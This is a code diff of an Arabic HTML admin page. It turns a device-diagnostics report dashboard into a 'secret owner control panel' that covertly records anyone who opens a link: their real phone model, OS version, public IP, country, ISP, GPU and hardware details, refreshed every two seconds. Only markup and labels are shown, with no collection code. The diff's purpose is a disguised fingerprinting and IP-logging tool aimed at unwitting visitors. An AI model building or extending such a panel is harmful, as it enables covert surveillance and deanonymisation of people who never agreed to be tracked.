@@ -3,28 +3,28 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>لوحة التحكم | تقارير فحص كتاب دياجنوستكس</title>
+  <title>🔒 لوحة التحكم السرية للمالك | كشف الهواتف والـ IP الحقيقي</title>
   <link rel="stylesheet" href="/css/style.css">
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📊</text></svg>">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
 </head>
 <body>
   <div class="container">
     <!-- Header -->
     <header class="app-header">
       <div class="brand-wrapper">
-        <div class="brand-icon">📊</div>
+        <div class="brand-icon" style="background: linear-gradient(135deg, #EF4444, #F59E0B);">🔒</div>
         <div>
-          <h1 class="brand-title">لوحة تحكم فحص الأجهزة</h1>
-          <p class="brand-tag">مراقبة حية للأجهزة المتصلة وتقارير البطارية والعتاد</p>
+          <h1 class="brand-title">لوحة التحكم المركزية السرية للمالك</h1>
+          <p class="brand-tag">كشف دقيق 100% لموديل الهاتف، إصدار الأندرويد الحقيقي، عنوان الـ IP العام ومزود الخدمة</p>
         </div>
       </div>
       <div class="nav-links">
         <span class="pulse-indicator" id="live-status">
           <span class="pulse-dot"></span>
-          <span id="live-status-text">متصل بالسيرفر (مباشر)</span>
+          <span id="live-status-text">تحديث لحظي نشط (2s)</span>
         </span>
-        <button id="btn-refresh" class="btn btn-outline">🔄 تحديث</button>
-        <a href="/" class="btn btn-outline">🏠 صفحة الهبوط</a>
+        <button id="btn-refresh" class="btn btn-outline">🔄 تحديث يدوي</button>
+        <a href="/" class="btn btn-outline">🌐 الصفحة الرئيسية</a>
       </div>
     </header>
 
@@ -36,7 +36,7 @@
           <span class="stat-icon">📱</span>
         </div>
         <div class="stat-value" id="stat-total-devices">0</div>
-        <div class="stat-sub">تقارير واردة من التطبيق</div>
+        <div class="stat-sub">أجهزة سجلت دخولها بدقة</div>
       </div>
 
       <div class="stat-card">
@@ -45,7 +45,7 @@
           <span class="stat-icon">🔋</span>
         </div>
         <div class="stat-value" id="stat-avg-battery">0%</div>
-        <div class="stat-sub">عبر جميع الأجهزة المسجلة</div>
+        <div class="stat-sub">عبر جميع الأجهزة المفحوصة</div>
       </div>
 
       <div class="stat-card">
@@ -54,16 +54,16 @@
           <span class="stat-icon">🌡️</span>
         </div>
         <div class="stat-value" id="stat-avg-temp">0°C</div>
-        <div class="stat-sub">المعدل الطبيعي: 25°C - 38°C</div>
+        <div class="stat-sub">المعدل الطبيعي: 28°C - 38°C</div>
       </div>
 
       <div class="stat-card">
         <div class="stat-header">
-          <span class="stat-title">تنبيهات الأمان والروت</span>
-          <span class="stat-icon">⚠️</span>
+          <span class="stat-title">الأجهزة المروّتة / التنبيهات</span>
+          <span class="stat-icon">🛡️</span>
         </div>
         <div class="stat-value" id="stat-root-count" style="color: var(--warning);">0</div>
-        <div class="stat-sub">أجهزة مروتة أو بطاريات غير سليمة</div>
+        <div class="stat-sub">حالة حماية النظام</div>
       </div>
     </section>
 
@@ -71,9 +71,9 @@
     <section class="card">
       <div class="card-header">
         <div>
-          <h2 class="card-title">سجل التقارير الواردة لحظياً</h2>
+          <h2 class="card-title">سجل الهواتف والـ IP المكتشف لحظياً</h2>
           <p style="font-size: 13px; color: var(--text-secondary); margin-top: 4px;">
-            يتم تحديث هذا الجدول تلقائياً فور قيام أي مستخدم بفتح التطبيق وإتمام الفحص.
+            يتحدث هذا الجدول تلقائياً كل ثانيتين فور فتح أي شخص للرابط على هاتفه.
           </p>
         </div>
         <div style="display: flex; gap: 12px; align-items: center; flex-wrap: wrap;">
@@ -81,7 +81,7 @@
             type="text" 
             id="search-input" 
             class="search-input" 
-            placeholder="🔍 بحث باسم الجهاز، الموديل، أو عنوان IP..."
+            placeholder="🔍 بحث بالموديل، الـ IP، الدولة، أو النظام..."
           >
           <button id="btn-export-json" class="btn btn-outline" style="font-size: 13px; padding: 8px 14px;">
             📥 تصدير JSON
@@ -94,22 +94,21 @@
           <thead>
             <tr>
               <th>#</th>
-              <th>الجهاز والموديل</th>
+              <th>الموديل الحقيقي (Device & Model)</th>
+              <th>نظام التشغيل الفعلي (Real OS)</th>
+              <th>عنوان الـ IP العام والدولة والمزود</th>
               <th>شحن البطارية</th>
-              <th>الحالة والكفاءة</th>
-              <th>الحرارة</th>
-              <th>الجهد (Volt)</th>
-              <th>النظام والعتاد</th>
-              <th>حالة الروت</th>
-              <th>تاريخ الفحص</th>
+              <th>كرت الشاشة (GPU Renderer)</th>
+              <th>العتاد والذاكرة والشاشة</th>
+              <th>وقت الدخول</th>
               <th>الإجراءات</th>
             </tr>
           </thead>
           <tbody id="reports-table-body">
             <tr>
-              <td colspan="10" class="empty-state">
+              <td colspan="9" class="empty-state">
                 <div class="empty-state-icon">⏳</div>
-                <p>جاري تحميل سجلات الفحص...</p>
+                <p>جاري تحميل السجلات...</p>
               </td>
             </tr>
           </tbody>
@@ -123,7 +122,7 @@
     <div class="modal-content">
       <div class="modal-header">
         <div>
-          <h3 style="font-size: 20px; font-weight: 800;" id="modal-device-title">تفاصيل الفحص الشامل</h3>
+          <h3 style="font-size: 20px; font-weight: 800;" id="modal-device-title">تفاصيل فحص الهاتف الشامل</h3>
           <p style="font-size: 12px; color: var(--text-secondary);" id="modal-device-id">معرف الجهاز: --</p>
         </div>
         <button class="modal-close" id="modal-close-btn">&times;</button>
